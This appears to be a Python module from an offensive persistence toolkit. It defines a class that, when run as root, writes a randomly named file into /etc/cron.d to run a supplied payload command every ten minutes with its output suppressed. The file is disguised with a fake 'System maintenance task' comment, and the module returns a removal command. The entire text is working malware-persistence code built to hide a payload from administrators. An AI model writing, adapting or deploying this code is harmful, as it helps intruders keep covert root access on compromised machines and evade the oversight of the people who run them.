import os
from ..core import CronPersistence
from ..utils.helpers import generate_random_name

class SystemCronPersistence(CronPersistence):
    def create(self, payload_command: str, cron_dir: str = "/etc/cron.d"):
        if not self.is_root:
            print("[!] Root privileges required")
            return None

        filename = generate_random_name()
        cron_file = f"{cron_dir}/{filename}"
        content = f"# System maintenance task\n*/10 * * * * root {payload_command} >/dev/null 2>&1\n"

        try:
            with open(cron_file, 'w') as f:
                f.write(content)
            os.chmod(cron_file, 0o644)
            print(f"[+] System cron installed: {cron_file}")
            return {
                'method': 'system_cron',
                'location': cron_file,
                'remove_command': f'rm -f {cron_file}'
            }
        except Exception as e:
            print(f"[-] Error: {e}")
            return None